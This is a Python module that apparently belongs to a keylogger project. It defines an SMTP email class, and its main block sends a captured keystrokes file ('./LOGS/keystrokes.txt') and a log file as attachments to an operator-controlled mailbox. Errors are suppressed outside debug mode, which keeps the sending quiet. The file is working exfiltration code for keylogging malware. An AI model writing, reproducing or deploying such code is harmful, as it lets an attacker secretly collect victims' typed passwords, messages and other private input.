import smtplib,ssl
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
try:
    from .config import DEBUG,SMTP_SERVER,SMTP_PORT,USERNAME,PASSWORD
    if DEBUG:
        from keylogger import psw
except ImportError:
    from config import DEBUG,SMTP_SERVER,SMTP_PORT,USERNAME,PASSWORD
    if DEBUG:
        import psw

class SendEmail:
    def __init__(self) -> None:
        if DEBUG:
            self.USERNAME = psw.email
            self.PASSWORD = psw.psw
        else:
            self.USERNAME = USERNAME
            self.PASSWORD = PASSWORD
        
    def send_email(self,*args:str,sender_email:str,receiver_email:str,subject:str,body:str) -> None:
        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = receiver_email
        message["Subject"] = subject
        
        # Attach email body
        message.attach(MIMEText(body, "plain"))
        
        # Attach file
        if args:
            for file_path in args:
                with open(file_path, "rb") as attachment:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(attachment.read())

                encoders.encode_base64(part)  # Encode to base64
                part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(file_path)}")  # Manually set file name
                message.attach(part)  # Attach the file to the email

        context = ssl.create_default_context()
        # Send email
        try:
            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT,timeout=15) as server:
                server.ehlo()  # Can be omitted
                server.starttls(context=context)
                server.ehlo()  # Can be omitted
                server.login(self.USERNAME, self.PASSWORD)
                server.sendmail(sender_email, receiver_email, message.as_string())
        except Exception as e:
            if DEBUG:
                print(f"Error sending email: {e}")





if __name__ == "__main__" and DEBUG:
    app = SendEmail()
    app.send_email(
        "./LOGS/logs.log",
        "./LOGS/keystrokes.txt",
        receiver_email=psw.email,
        sender_email=psw.email,
        subject="Email with Attachment",
        body="Hello, please find the attached file."
    )